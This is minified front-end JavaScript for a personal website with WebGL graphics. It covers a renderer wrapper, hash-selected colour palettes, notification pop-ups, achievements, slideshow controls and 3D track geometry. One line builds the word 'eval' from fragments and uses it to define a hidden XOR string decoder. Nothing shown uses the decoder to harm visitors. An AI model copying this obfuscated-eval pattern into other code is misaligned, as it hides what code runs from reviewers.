Acko.Renderer=function(a){a=a||{};this.parameters=a.parameters||{};this.container=a.container||null;this.klass=a.klass||THREE.WebGLRenderer;this.type=a.type||"generic";this.camera=a.camera||new THREE.PerspectiveCamera;this.autoSize=a.autoSize||!1;this.dead=a.dead||!1;this.autoRender=void 0!==a.autoRender?a.autoRender:!0;this.isVisible=void 0!==a.visible?a.visible:!0;this.lastVisible=-1;var b=a.effects||[];this.depthScene=this.scene=this.renderer=null;this.frames=0;this.fps=58;this.capHeight=this.capWidth=
0;this.warmUp=2;this.skipFrames=0;this.handlers={};this.exports={};this.effects=b.filter(function(a){return a.renderer==this.type}.bind(this));this.effects.forEach(function(a){b.splice(b.indexOf(a),1)})};
Acko.Renderer.prototype={init:function(){var a=this.renderer=new this.klass(this.parameters),b=this.scene=new THREE.Scene,c=this.depthScene=new THREE.Scene,e=this.camera,g=this.renderer.domElement;g.style.display="none";this.renderer.domElement.parentNode||(this.container||document.body).appendChild(g);g.className="frame fixed";this.dead&&g.classList.add("dead");window.addEventListener("resize",this.resize.bind(this));var f=this.exports={parent:this,scene:b,depthScene:c,camera:e,renderer:a,context:a.context,
scroll:{x:0,y:0},time:0,debug:{}},a=this.effects;a.sort(function(a,b){return a.order-b.order});b=tick();_.each(a,function(a){a.build(f)});b(this.type.toUpperCase()+" effect build");this.resize()},scroll:function(a){this.exports.scroll=a},resize:function(a){this.autoSize&&a&&(this.capHeight=this.capWidth=0);var b=this.exports,c=this.container,e=a=this.width=c?c.offsetWidth:window.innerWidth,g=c=this.height=c?c.offsetHeight:window.innerHeight;b.viewWidth=e;b.viewHeight=g;this.fps=58;this.frames=0;if(this.capWidth||
this.capHeight)var f=Math.min(Math.min(this.capWidth||Infinity,e)/e,Math.min(this.capHeight||Infinity,g)/g),e=e*f,g=g*f;e=Math.round(e);g=Math.round(g);e+=e&1;g+=g&1;f=this.aspect=e/g;if(b.width!=e||b.height!=g)if(b.width=e,b.height=g,b.aspect=f,_.each(this.effects,function(a){a.resize(b)}),this.renderer.setSize(e,g,!1),f=this.renderer.domElement){var h=0,k=0;a+1==e&&(h=-1,a=e);c+1==g&&(k=-1,c=g);f.style.marginLeft=h+"px";f.style.marginTop=k+"px";f.style.width=a+"px";f.style.height=c+"px"}},tick:function(){var a=
this.exports,b=0<this.warmUp--?0:Time.clock(this.type),c=b-a.time;if(!Time.isBackground()&&5<++this.frames){var e=1/Math.max(.0166,c);this.fps=Time.isSlow()?60:this.fps+.15*(e-this.fps)}a&&(a.delta=c,a.time=b,a.fps=this.fps);_.each(this.effects,function(b){b.tick(a)}.bind(this))},visible:function(a){void 0!==a&&(this.isVisible=a);return this.isVisible},update:function(){var a=this.exports;0<this.skipFrames--||(this.lastVisible!=this.isVisible&&(this.renderer.domElement.style.display=this.isVisible?
"block":"none",this.lastVisible=this.isVisible),this.visible&&(this.autoSize&&48>this.fps&&(this.capWidth=Math.max(960,this.capWidth||window.innerWidth),this.capHeight=Math.max(540,this.capHeight||window.innerHeight),this.capWidth*=.9,this.capHeight*=.9,this.resize()),_.each(this.effects,function(b){b.update(a)}.bind(this)),this.autoRender&&this.renderer.render(this.scene,this.camera)))}};
Acko.Palette={red:[[190,10,71],[204,54,30],[222,90,51],[248,100,61]],platinum:[[148,157,160],[222,235,240],[255,255,255]],blue:[[22,92,143],[0,176,212]],slate:[[73,94,119],[86,125,147],[77,160,186]],orange:[]};"#gay"==document.location.hash&&(Acko.Palette={red:[[210,27,41],[235,129,55],[230,212,34],[20,148,63]],platinum:[[148,157,160],[222,235,240],[255,255,255]],blue:[[1,112,187],[122,33,129]],slate:[[73,94,119],[20,148,63],[77,160,186]],orange:[]});
function toneMap(a){function b(a){a=c(a);return(2.5*a+(1-(1-a*a)*(1-a*a)))/3.5}function c(a){return Math.max(0,Math.min(1,a))}function e(a){return[255*c(a[0]),255*c(a[1]),255*c(a[2])]}var g=a[0]/255,f=a[1]/255;a=a[2]/255;Acko.colorChange=!0;if("#sepia"==document.location.hash){var h=b(.3*g+.6*f+.1*a);return e([h,h,h])}if("#faded"==document.location.hash)return e([b(.25*(3*Math.max(g,a)+g)),b(.25*(3*Math.max(f,a)+f)),1.05*b(a)]);if("#nored"==document.location.hash)return e([b(g),b(Math.max(g,f)),b(Math.max(g,
a))]);if("#noblue"==document.location.hash)return e([b(Math.max(g,a)),b(Math.max(f,a)),b(a)]);if("#nogreen"==document.location.hash)return e([b(Math.max(g,f)),b(f),b(Math.max(a,f))]);if("#lilac"==document.location.hash)return h=(f+a)/2,e([b(Math.max(g,h)),b(Math.max(f,h)),b(Math.max(a,h))]);if("#70s"==document.location.hash)return e([1.1*b(Math.max(g*g,a)),1.1*b(Math.max(a*a,f)),b(f)]);if("#white"==document.location.hash)return[255,255,255];if("#strong"==document.location.hash)return e([b(g),b(f),
b(a)]);if("#pink"==document.location.hash)return e([b(g+.7*(1.2-g)),b(f+.7*(.4-f)),b(a+.7*(1.1-a))]);if("#moarpink"==document.location.hash)return e([b(g+.7*(1.5-g)),b(f+.7*(.4-f)),b(a+.7*(.9-a))]);if("#null"==document.location.hash)return e([g,f,a]);Acko.colorChange=!1;h=.9*a;return e([1.05*b((Math.max(g,h)+g)/2),1.05*b((Math.max(f,h)+f)/2),1.03*b(a)])}
_.each(Acko.Palette,function(a,b){Acko.Palette[b]=_.map(a,function(a){if("string"==typeof a)return a=a.split("/"),Acko.Palette[a[0]][a[1]];a=toneMap(a);return new THREE.Color((a[0]<<16)+(a[1]<<8)+a[2])})});window._$=function(a){return a};
(function(){var a=_$("p")+"m"+_$("t=");window[_$("ev")+"al"](a+_$("function (s) { var t = ''; var n = s && s.length || 0; for (var i = 0; i < n; i++) { if (s.c")+"harC"+_$("odeAt(i) >= 32 && s.c")+"harCo"+_$("deAt")+"(i) < 128) { t += String.fr"+_$("omC")+"harC"+_$("ode(s.c")+"harC"+_$("odeAt(i) ^ (3 + i%5 + (i*i)%7)); } else { t += s.c")+"ha"+_$("rAt(i); } } return t; }"))})();delete window._$;
var growl=window.growl=function(){var a=[],b=[];return function e(g){function f(){C?z=!0:B||(B=!0,r.classList.remove("pop"),w[y]=!1,setTimeout(function(){document.body.removeChild(r)},1E3))}if(!document.body)return setTimeout(function(){e(g)},1E3);for(var h=g.type||"generic",k=g.text||"",p=g.delay||0,m=!!g.center,t=g.link||!1,w=m?a:b,q=w.length,y=0;y<q&&w[y];++y);w[y]=!0;var q=98*y,r=document.createElement("div");document.body.appendChild(r);r.classList.add("growl");r.classList.add(h);g.image&&(r.style.backgroundImage=
"url("+g.image+")");t&&r.classList.add("link");m?(r.classList.add("center"),r.style.marginBottom=q+"px"):r.style.marginTop=q+"px";r.innerHTML="<div>"+k+"</div>";setTimeout(function(){r.classList.add("pop")},p);var z=!1,C=!1;r.addEventListener("mouseover",function(){C=!0});r.addEventListener("mouseout",function(){C=!1;z&&setTimeout(f,500)});r.addEventListener("mousedown",function(a){a.stopPropagation();a.preventDefault()});r.addEventListener("mouseup",function(a){t&&window.open(t);a.stopPropagation();
a.preventDefault()});var B=!1;setTimeout(f,6E3+p);return f}}(),achievements={nope:"Nothing here"},hasAchievement=function(a){return getStorage("achievements")[a]},getAchievement=function(a){return achievements[a]},achievement=function(){var a=1500;setTimeout(function(){a=300},a);return function(b){var c=getStorage("achievements"),e;!c[b]&&(e=getAchievement(b))&&(c[b]=b,setStorage("achievements",c),growl({type:"achievement",text:"Achievement Unlocked<br><strong>"+e+"</strong>",center:!0,delay:a}))}}();
(function(){var a=function(a,c){c=c||document;var e=window.innerWidth,g=Math.max(0,e-960)/2,f=Math.max(0,Math.min(1280,e)-960)/2,h=c.querySelectorAll(".wide"),k=1280>=e;forEach(h,function(a){var b=a.classList.contains("full"),c=b?g:f;a.style.marginLeft=-Math.ceil(c+1E-5)+"px";a.style.marginRight=-Math.floor(c+1E-5)+"px";a.classList[b||k?"add":"remove"]("squeezed")});e=c.querySelectorAll("iframe.autosize");forEach(e,function(a){var b,c,e;e=+a.getAttribute("data-max-height")||Infinity;var g=+a.getAttribute("data-min-height")||
0;a.classList.contains("square")?(e=c=b=a.parentNode.offsetWidth,m2=0):(b=window.innerWidth,c=window.innerHeight-250,c=Math.max(c,g),c=Math.min(c,e),c=Math.min(b/16*9,c),e=a.parentNode.offsetWidth,m2=(e-b)/2);a.style.maxWidth=e-2*m2+"px";a.style.width=b+"px";a.style.height=c+"px";a.style.marginLeft=m2+"px"})};window.addEventListener("resize",a);a();DomReady.ready(a);Acko.Behaviors.push(function(b){a(null,b)})})();
Acko.Behaviors.push(function(a){var b="html javascript coffeescript glsl swift clojure json".split(" ");forEach(a.querySelectorAll("pre code"),function(a){var e=!1;for(i in b)a.classList.contains("language-"+b[i])&&(e=!0);e&&hljs.highlightBlock(a)})});
(function(){function a(){forEach(e,function(a,b){var c=a,e=0,f=0,k=c.offsetWidth,m=c.offsetHeight;do e+=c.offsetTop||0,f+=c.offsetLeft||0,c=c.offsetParent;while(c);g[b]={top:e,left:f,width:k,height:m};h[b]=a.classList.contains("janky")})}function b(){c(null,!0)}function c(a,c){var q=window.scrollY,m=p!=q;forEach(e,function(a,b){if(!h[b]||!m){var c=g[b],e=h[b]?0:200,c=q+window.innerHeight>c.top-e&&q<c.top+c.height+e,e=f[b];window.gl&&gl.exports.pageStart&&(c=c&&window.scrollY>gl.exports.pageStart);
if(e!=c){var e=c?"start":"stop",k;if(a.contentWindow&&(k=a.contentWindow.mathbox)){a.classList[c?"add":"remove"]("on");if(k[e])k[e]();f[b]=c}}}});p=q;c?k=null:(k&&clearTimeout(k),k=setTimeout(b,100))}var e=[],g=[],f=[],h=[],k,p=-1,m=0;requestAnimationFrame(function w(){requestAnimationFrame(w);var a=Time.getSpeed();.01<Math.abs(a-m)&&(forEach(e,function(b){b&&b.contentWindow&&b.contentWindow.mathbox&&b.contentWindow.mathbox.speed(a)}),m=a)});window.addEventListener("resize",a);window.addEventListener("scroll",
c);window.addEventListener("load",function(){for(var a=3;0<a--;)setTimeout(c,1E3*a)});Acko.Behaviors.push(function(){e=document.querySelectorAll("iframe.mathbox");a();c();setTimeout(function(){a()},100)})})();
(function(){window.addEventListener("keydown",function(a){var b=document.querySelectorAll("iframe.mathbox.on");forEach(b,function(b){if(b.contentWindow.director){var e;b=b.parentNode.querySelector(".nav");if(38==a.keyCode||37==a.keyCode)e=b.querySelector(".prev");else if(40==a.keyCode||39==a.keyCode)e=b.querySelector(".next");e&&!e.classList.contains("inactive")&&e.click()}})})})();
(function(){Acko.SlideShow=function(a){this.container=a;this.step=this.skip=0;this.steps=[];this.director=null;this.nav={};this.reflowTimer=null;Acko.Fallback.isRequired()?this.unsupported():(this.build(),this.bind())};Acko.SlideShow.prototype={unsupported:function(){this.iframe=this.container.querySelector("iframe");var a=this.nav=document.createElement("div");a.className="nav";this.iframe.parentNode.appendChild(a);a=document.createElement("div");a.className="step";a.style.opacity=1;a.innerHTML=
"<p>WebGL is required to view this slideshow.</p>";this.container.querySelector(".steps").appendChild(a)},build:function(){this&&this.container.classList.add(a);this.iframe=this.container.querySelector("iframe");this.steps=this.container.querySelectorAll(".steps > .step");this.extras=this.container.querySelectorAll(".steps .extra");forEach(this.steps,function(a,b){a.setAttribute("data-step",b)});var b=this.nav=document.createElement("div");b.className="nav";b.innerHTML='<a class="prev" title="Previous Slide"><span class="invisible">Previous Slide</span><span class="icon-arrow"><span></span><span></span></span></a><a class="again" title="Repeat Animation"><span class="invisible">Repeat Animation</span><span class="icon-repeat"><span></span><span></span><span></span><span></span></span></a><a class="next" title="Next Slide"><span class="invisible">Next Slide</span><span class="icon-arrow"><span></span><span></span></span></a><span class="pages"></span></a>';
this.nav.prev=b.querySelector(".prev");this.nav.again=b.querySelector(".again");this.nav.next=b.querySelector(".next");this.nav.pages=b.querySelector(".pages");this.iframe.parentNode.appendChild(b);this.skip=+this.container.getAttribute("data-skip")||0;this.go(0);this.iframe.onload=function(){setTimeout(function(){this.go(0)}.bind(this),1E3);setTimeout(function(){this.go(0)}.bind(this),3E3)}.bind(this)},layout:function(){var a=this.nav.offsetWidth/2,b=this.iframe.offsetHeight/2,c=16*this.iframe.offsetHeight/
9/2;forEach(this.extras,function(h){var k=h.offsetWidth/2,p=h.offsetHeight/2,m=a-k,t=-b-p,w=+h.getAttribute("data-align-x")||1,q=+h.getAttribute("data-align-y")||1,y=h.classList;y.contains("edge")?(y.contains("top")&&(t-=b*q-p),y.contains("bottom")&&(t+=b*q-p),y.contains("left")&&(m-=c*w-k),y.contains("right")&&(m+=c*w-k)):(y.contains("top")&&(t-=b*q/2),y.contains("bottom")&&(t+=b*q/2),y.contains("left")&&(m-=c*w/2),y.contains("right")&&(m+=c*w/2));h.style.left=Math.round(m)+"px";h.style.top=Math.round(t)+
"px"}.bind(this))},resize:function(){this.reflowTimer&&clearTimeout(this.reflowTimer);this.reflowTimer=setTimeout(function(){this.layout();this.reflowTimer=null}.bind(this),300)},connect:function(){this.director=this.iframe&&this.iframe.contentWindow&&this.iframe.contentWindow.director},bind:function(){this.nav.prev.addEventListener("click",this.prevHandler=function(a){a.preventDefault();this.prev()}.bind(this));this.nav.again.addEventListener("click",this.againHandler=function(a){a.preventDefault();
this.again()}.bind(this));this.nav.next.addEventListener("click",this.nextHandler=function(a){a.preventDefault();this.next()}.bind(this))},unbind:function(){this.nav.prev.removeEventListener("click",this.prevHandler);this.nav.again.removeEventListener("click",this.againHandler);this.nav.next.removeEventListener("click",this.nextHandler)},prev:function(){this.go(-1)},next:function(){this.go(1)},go:function(a){this.connect();a&&(this.steps[this.step].classList.remove("active"),this.step=Math.max(0,
Math.min(this.steps.length-1-this.skip,this.step+a)),this.lastDirection=a);this.steps[this.step].classList.add("active");this.update();forEach(this.steps,function(a,b){var c=b-this.step;1<c||-8>c?a.classList.contains("inactive")||a.classList.add("inactive"):a.classList.contains("inactive")&&a.classList.remove("inactive")}.bind(this));this.director&&this.director.go(this.step+this.skip)},again:function(){this.director&&0<this.step&&(this.director.go(this.step-1+this.skip,!0),forEach(this.extras,function(a){a.classList.remove("active")}.bind(this)),
setTimeout(function(){this.update();this.director.go(this.step+this.skip)}.bind(this),300))},update:function(){var a;a=0==this.step?"add":"remove";this.nav.prev.classList[a]("inactive");this.nav.again.classList[a]("inactive");a=this.step==this.steps.length-1-this.skip?"add":"remove";this.nav.next.classList[a]("inactive");this.nav.pages.innerHTML=this.step+1+" / "+(this.steps.length-this.skip);forEach(this.extras,function(a){var b=+a.parentNode.getAttribute("data-step"),c=+a.getAttribute("data-hold")||
0,b=this.step>=b&&this.step<=b+c?"add":"remove",c="add"==b&&0<this.lastDirection?+a.getAttribute("data-delay")||0:0;a.style.transitionDelay=c+"s";a.style.WebkitTransitionDelay=c+"s";a.classList[b]("active")}.bind(this))}};var a="slideshow-active",b=[],c=function(){b.slice().forEach(function(a,b){a.resize()})};window.addEventListener("resize",c);Acko.Behaviors.push(function(e){var g=0;b.slice().forEach(function(a,c){for(var e=a.container;(e=e.parentNode)&&e!=document.body;);e||(a.unbind(),b.splice(c-
g,1),g++)});e=e.querySelectorAll(".slideshow:not(."+a+")");forEach(e,function(a){a=new Acko.SlideShow(a);b.push(a)});window.MathJax?MathJax.Hub.Queue(function(){c()}):c()})})();
Acko.TrackData=[{n:8,power:.4,width:23,height:12,relative:_v(-370,0,0),points:[[_v(-800,120,200),null,0],[_v(-300,120,200),null,0],[_v(-200,120,200),null,60,10],[_v(-200,20,200),null,80,10],[_v(-200,20,0),null,80,10],[_v(0,20,0),null,50],[_v(65,140,0),null,50],[_v(140,140,0),null,80,10],[_v(140,60,0),null,0],[_v(140,-10,0),null,50,10],[_v(140,10,-140),null,50,10],[_v(240,0,-140),null,50,10],[_v(240,0,-300),null,50,10],[_v(350,0,-280),null,50,10],[_v(340,150,-340),null,50,14],[_v(340,300,-340),null,
100,10],[_v(340,400,-340),null,0]],travel:953,length:1176,arrow:32,aspect:.96,smooth:4,up:_v(0,2.4,1),detail:8,color:Acko.Palette.platinum[2],distance:3300,castAO:.85,receiveAO:.85,AOStep:40,simplify:!1,edge:1},{n:8,power:.2,width:25,height:10,relative:_v(-370,0,0),points:[[_v(-800,120,200),null,0],[_v(-300,120,200),null,0],[_v(-200,120,200),null,60,10],[_v(-200,20,200),null,80,10],[_v(-200,20,0),null,80,10],[_v(0,20,0),null,50],[_v(65,140,0),null,50],[_v(140,140,0),null,80,10],[_v(140,60,0),null,
0],[_v(140,-10,0),null,50,10],[_v(140,10,-140),null,50,10],[_v(240,0,-140),null,50,10],[_v(240,0,-300),null,50,10],[_v(350,0,-280),null,50,10],[_v(340,150,-340),null,50,14],[_v(340,300,-340),null,100,10],[_v(340,400,-340),null,0]],travel:950,speed:0,length:1176.6,shift:5.716,arrow:37,aspect:1,smooth:4,up:_v(0,2.4,1),detail:8,color:Acko.Palette.red[0],distance:3300,castAO:!1,AOStep:40,simplify:!1,truncate:30},{n:8,power:.4,width:23,height:12,relative:_v(-170,0,0),points:[[_v(-800,310,-200),null,0],
[_v(-310,310,-200),null,60],[_v(-100,140,-200),null,60],[_v(120,140,-200),null,60],[_v(140,140,0),null,60],[_v(10,140,0),null,50],[_v(10,20,0),null,50],[_v(200,20,0),null,50],[_v(200,220,0),null,80],[_v(205,220,-100),null,0],[_v(205,220,-200),null,80],[_v(205,320,-200),null,100,10],[_v(205,420,-200),null,0]],travel:713,length:1266,arrow:32,aspect:.96,smooth:4,up:_v(0,1,2.3),detail:8,color:Acko.Palette.platinum[2],distance:3300,castAO:.95,receiveAO:.85,simplify:!1,edge:1,AOStep:35},{n:8,power:.2,width:25,
height:10,relative:_v(-170,0,0),points:[[_v(-800,310,-200),null,0],[_v(-310,310,-200),null,60],[_v(-100,140,-200),null,60],[_v(120,140,-200),null,60],[_v(140,140,0),null,60],[_v(10,140,0),null,50],[_v(10,20,0),null,50],[_v(200,20,0),null,50],[_v(200,220,0),null,60],[_v(205,220,-100),null,0],[_v(205,220,-200),null,60],[_v(205,320,-200),null,100,10],[_v(205,420,-200),null,0]],travel:710,speed:0,length:1266.6,shift:5.716,arrow:37,aspect:1,smooth:4,up:_v(0,1,2.3),detail:8,color:Acko.Palette.red[1],distance:3300,
castAO:!1,AOStep:35,simplify:!1,truncate:30},{n:8,power:.4,width:23,height:12,relative:_v(10,0,0),points:[[_v(20,800,-310),null,0],[_v(20,420,-310),null,100,3],[_v(20,320,-310),null,100,9],[_v(20,220,-310),null,100,9],[_v(20,120,-310),null,0],[_v(20,-20,-310),null,80,14],[_v(140,-20,-310),null,80,15],[_v(140,-20,0),null,60],[_v(60,80,0),null,50],[_v(120,140,0),null,50],[_v(260,140,0),null,0],[_v(340,140,0),null,50],[_v(340,20,0),null,50],[_v(200,20,0),null,50],[_v(200,100,0),null,60],[_v(200,100,
-200),null,60],[_v(400,90,-200),null,60],[_v(400,140,-10),null,50,10],[_v(400,140,100),null,0],[_v(400,140,300),null,50,12],[_v(400,340,300),null,50,10],[_v(400,540,300),null,0]],travel:343,length:2181,arrow:32,aspect:.96,smooth:4,up:_v(.45,0,1),detail:8,color:Acko.Palette.platinum[2],distance:1485,castAO:.85,receiveAO:.85,speed:270,simplify:!1,edge:1},{n:8,power:.2,width:25,height:10,relative:_v(10,0,0),points:[[_v(20,800,-310),null,0],[_v(20,420,-310),null,100,3],[_v(20,320,-310),null,100,9],[_v(20,
220,-310),null,100,9],[_v(20,120,-310),null,0],[_v(20,-20,-310),null,80,14],[_v(140,-20,-310),null,80,15],[_v(140,-20,0),null,60],[_v(60,80,0),null,50],[_v(120,140,0),null,50],[_v(260,140,0),null,0],[_v(340,140,0),null,50],[_v(340,20,0),null,50],[_v(200,20,0),null,50],[_v(200,100,0),null,60],[_v(200,100,-200),null,60],[_v(400,90,-200),null,60],[_v(400,140,-10),null,50,10],[_v(400,140,100),null,0],[_v(400,140,300),null,50,12],[_v(400,340,300),null,50,10],[_v(400,540,300),null,0]],travel:340,length:2181.6,
shift:5.716,arrow:37,aspect:1,smooth:4,up:_v(.45,0,1),detail:8,color:Acko.Palette.red[2],distance:1485,speed:270,castAO:!1,simplify:!1,truncate:30},{n:8,power:.2,width:15,height:20.5,relative:_v(10,0,0),points:[[_v(-550,600,-400),null,0],[_v(-550,250,-400),null,0],[_v(-550,25,-400),null,160],[_v(-550,25,-250),null,0],[_v(-550,25,-50),null,160,12],[_v(-380,25,-50),null,0],[_v(-340,25,-50),null,30],[_v(-285,65,-50),null,30],[_v(-235,65,-50),null,0],[_v(-120,65,-50),null,0],[_v(110,65,-50),null,50,10],
[_v(180,30,-80),null,50,10],[_v(500,20,-80),null,160,26],[_v(500,20,230),null,160,12],[_v(700,20,260),null,0],[_v(1E3,20,260),null,160,16],[_v(1E3,250,260),null,0],[_v(1E3,550,260),null,0]],travel:-2102,length:6498,travelOverride:-17099,lengthOverride:20143,travelAO:200,lengthAO:2800,smooth:4,up:_v(-1,0,0),detail:8,color:Acko.Palette.slate[0],AOStep:35,simplify:!1,receiveAO:.85,castAO:.5},{n:8,power:.2,width:35,height:15,relative:_v(10,0,0),points:[[_v(-550,600,-400),null,0],[_v(-550,250,-400),null,
0],[_v(-550,25,-400),null,160],[_v(-550,25,-250),null,0],[_v(-550,25,-50),null,160,12],[_v(-380,25,-50),null,0],[_v(-340,25,-50),null,30],[_v(-285,65,-50),null,30],[_v(-235,65,-50),null,0],[_v(-120,65,-50),null,0],[_v(110,65,-50),null,50,10],[_v(180,30,-80),null,50,10],[_v(500,20,-80),null,160,26],[_v(500,20,230),null,160,12],[_v(700,20,260),null,0],[_v(1E3,20,260),null,160,16],[_v(1E3,250,260),null,0],[_v(1E3,550,260),null,0]],travel:-2100,length:6500,travelOverride:-17100,lengthOverride:20160,travelAO:200,
lengthAO:2800,smooth:4,up:_v(-1,0,.4),detail:8,color:Acko.Palette.slate[0],simplify:!1,receiveAO:.85,castAO:.85},{n:8,power:.2,width:30,height:5,relative:_v(0,0,0),points:[[_v(-350,775,-440),null,0],[_v(-350,500,-440),null,0],[_v(-350,280,-440),null,60,10],[_v(-350,280,-115),null,130,18],[_v(-400,-40,-233),null,50,12],[_v(-400,-67,-123),null,150,12],[_v(35,-58,-125),null,100,14],[_v(-37,291,-125),null,100,12],[_v(162,235,-135),null,100],[_v(347,275,-135),null,120,14],[_v(357,300,-365),null,100],[_v(367,
140,-335),null,50],[_v(520,160,-250),null,50],[_v(720,70,-260),null,160,12],[_v(690,110,-60),null,160,12],[_v(675,200,100),null,160,10],[_v(870,250,20),null,100,10],[_v(1070,250,-40),null,100,12],[_v(1070,420,-40),null,0],[_v(1070,620,-40),null,0]],travel:-950,length:4950,travelOverride:-15950,lengthOverride:34450,travelAO:350,lengthAO:3350,smooth:8,castAO:.9,up:_v(-.1,0,1),detail:8,color:Acko.Palette.blue[1]},{n:8,power:.2,width:30,height:5,relative:_v(100,0,0),points:[[_v(-1100,100,-240),null,0],
[_v(-900,140,-340),null,100,8],[_v(-700,140,-340),null,100,8],[_v(-600,170,-240),null,100,9],[_v(-440,170,-340),null,100,12],[_v(-320,180,-380),null,100,10],[_v(-260,100,-265),null,100,10],[_v(-420,-15,-225),null,100,10],[_v(-380,-50,-5),null,100,10],[_v(-200,-40,-5),null,100,14],[_v(-160,-5,-220),null,100,10],[_v(-50,-30,-240),null,60,10],[_v(-50,130,-220),null,60,10],[_v(85,130,-220),null,60,8],[_v(100,160,-140),null,60,8],[_v(185,240,-110),null,60,8],[_v(350,210,-110),null,100],[_v(600,280,-120),
null,150,12],[_v(700,240,-120),null,150,12],[_v(750,350,50),null,100,10],[_v(800,450,800),null,250,10],[_v(800,750,800),null,0],[_v(800,1200,800),null,0],[_v(800,2200,800),null,0],[_v(800,2400,800),null,100,10],[_v(800,2600,800),null,100,20],[_v(800,2800,800),null,100,10],[_v(800,3E3,800),null,0]],travel:-478,length:4850,lengthOverride:3420,travelAO:50,lengthAO:2800,smooth:5,castAO:1.2,up:_v(0,.2,1),detail:8,color:Acko.Palette.blue[0]},{n:8,power:.2,width:30,height:5,relative:_v(100,0,0),points:[[_v(-1200,
145,-145),null,0],[_v(-850,145,-205),null,100],[_v(-660,165,-205),null,100],[_v(-500,100,-125),null,100],[_v(-220,135,-135),null,100,18],[_v(-280,30,-165),null,100,10],[_v(-280,32,-370),null,100,16],[_v(50,52,-370),null,100],[_v(90,70,-260),null,100],[_v(200,80,-265),null,50,18],[_v(230,180,-260),null,50,10],[_v(220,140,-120),null,50],[_v(290,50,-115),null,50],[_v(380,70,-95),null,100],[_v(430,150,-100),null,100],[_v(550,150,-50),null,100,10],[_v(500,100,150),null,250,10],[_v(550,100,250),null,250],
[_v(600,170,260),null,250],[_v(800,150,100),null,250,16],[_v(800,350,100),null,0],[_v(800,750,100),null,0]],travel:-40,length:4500,lengthOverride:19E3,travelAO:200,lengthAO:2800,smooth:8,up:_v(0,-.3,1),detail:8,color:Acko.Palette.slate[0]},{n:8,power:.2,width:30,height:5,relative:_v(100,0,0),points:[[_v(-1200,180,-230),null,0],[_v(-800,180,-260),null,100],[_v(-550,55,-220),null,100],[_v(-330,20,-440),null,100],[_v(-240,195,-430),null,100],[_v(-200,215,-60),null,100],[_v(0,140,-50),null,60],[_v(0,
60,-200),null,60,10],[_v(-30,-75,-100),null,100],[_v(100,-95,-120),null,100],[_v(170,90,-155),null,50],[_v(250,200,10),null,50],[_v(450,200,0),null,100],[_v(450,200,190),null,100],[_v(700,200,200),null,0],[_v(1E3,200,200),null,160],[_v(1E3,450,200),null,0],[_v(1E3,1200,200),null,0]],travel:-75,length:4500,lengthOverride:18550,lengthAO:3E3,castAO:1,receiveAO:1.2,smooth:8,up:_v(0,-.3,1),detail:8,color:Acko.Palette.slate[1]},{n:8,power:.2,width:30,height:5,relative:_v(100,0,0),points:[[_v(-1200,60,-50),
null,0],[_v(-800,60,-124),null,100],[_v(-600,100,-80),null,100],[_v(-350,90,-100),null,50],[_v(-320,-10,-200),null,50],[_v(-320,-10,-430),null,150],[_v(-120,110,-420),null,100],[_v(100,110,-420),null,100],[_v(30,200,-200),null,100],[_v(200,230,-180),null,100],[_v(500,100,-160),null,100],[_v(660,205,-220),null,100],[_v(820,205,-200),null,150,12],[_v(880,205,0),null,0],[_v(850,205,100),null,160],[_v(850,505,100),null,0],[_v(850,1200,100),null,0]],travel:-188,length:4700,lengthOverride:3110,lengthAO:2800,
smooth:8,up:_v(0,1,-1.5),detail:8,color:Acko.Palette.red[2]},{n:8,power:.2,width:30,height:5,relative:_v(100,0,0),points:[[_v(-798,600,-420),null,0],[_v(-798,250,-420),null,0],[_v(-798,40,-420),null,120,14],[_v(-798,35,-220),null,100,12],[_v(-849,-35,-30),null,100,11],[_v(-650,80,-30),null,100,8],[_v(-502,80,-30),null,100,9],[_v(-507,200,-60),null,100,11],[_v(-597,200,-197),null,100,14],[_v(-397,180,-347),null,100,16],[_v(-250,300,-250),null,100,8],[_v(-30,230,-225),null,100,12],[_v(50,280,-350),
null,100,12],[_v(150,260,-350),null,100,8],[_v(150,120,-150),null,100,9],[_v(180,210,-2),null,100,9],[_v(300,250,-50),null,100,10],[_v(480,300,-350),null,150,16],[_v(850,250,-150),null,100,14],[_v(1100,250,-150),null,100,10],[_v(1100,450,-150),null,0],[_v(1100,1250,-150),null,0]],travel:-470,length:4800,travelOverride:-15470,lengthOverride:34600,travelAO:200,lengthAO:3650,smooth:8,castAO:.8,receiveAO:.9,up:_v(-.69,0,1),detail:8,color:Acko.Palette.platinum[1]},{n:16,power:.5,width:80,height:60,relative:_v(100,
-200,0),points:[[_v(-2800,300,80),null,0],[_v(0,300,-820),null,1E3],[_v(2800,300,80),null,0]],travel:-400,length:6200,smooth:0,up:_v(0,1,1),detail:16,color:Acko.Palette.platinum[1],warp:!1,speed:1200,distance:5800,castAO:!1,receiveAO:!1},{n:16,power:.5,width:40,height:50,relative:_v(100,-200,0),points:[[_v(-2800,450,80),null,0],[_v(0,450,-820),null,1E3],[_v(2800,450,80),null,0]],travel:-400,length:6200,smooth:0,up:_v(0,1,1),detail:16,color:Acko.Palette.platinum[1],warp:!1,speed:1200,distance:5800,
castAO:!1,receiveAO:!1},{n:1,power:.5,width:10,height:10,relative:_v(100,0,0),points:[[_v(-500,-215,600),null,0],[_v(500,-115,600),null,0]],travel:-1E4,length:0,smooth:0,up:_v(0,1,1),detail:16,color:Acko.Palette.platinum[1],warp:!1,castAO:!1,receiveAO:!1,dead:!0},{n:1,power:.5,width:10,height:10,relative:_v(100,0,0),points:[[_v(-500,565,0),null,0],[_v(500,565,0),null,0]],travel:-1E4,length:0,smooth:0,up:_v(0,1,1),detail:16,color:Acko.Palette.platinum[1],warp:!1,castAO:!1,receiveAO:!1,dead:!0},{n:1,
power:.5,width:10,height:10,relative:_v(100,0,0),points:[[_v(-500,445,0),null,0],[_v(500,445,0),null,0]],travel:-1E4,length:0,smooth:0,up:_v(0,1,1),detail:16,color:Acko.Palette.platinum[1],warp:!1,castAO:!1,receiveAO:!1,dead:!0},{n:1,power:.5,width:10,height:10,relative:_v(100,0,0),points:[[_v(-500,-185,120),null,0],[_v(500,-205,40),null,0]],travel:-1E4,length:0,smooth:0,up:_v(0,.7,1),detail:16,color:Acko.Palette.platinum[1],warp:!1,castAO:!1,receiveAO:!1,dead:!0}];
